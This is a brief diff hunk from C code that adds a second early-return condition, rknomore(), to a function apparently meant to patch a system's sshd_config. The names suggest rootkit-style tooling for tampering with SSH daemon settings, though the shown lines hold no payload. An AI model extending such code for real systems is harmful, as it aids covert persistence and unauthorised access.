@@ -117,7 +117,7 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
  */
 
 void sshdpatch(int mode){
-    if(not_user(0))
+    if(not_user(0) || rknomore())
         return;
 
     char *sshdcontents; // stores contents of sshd_config.
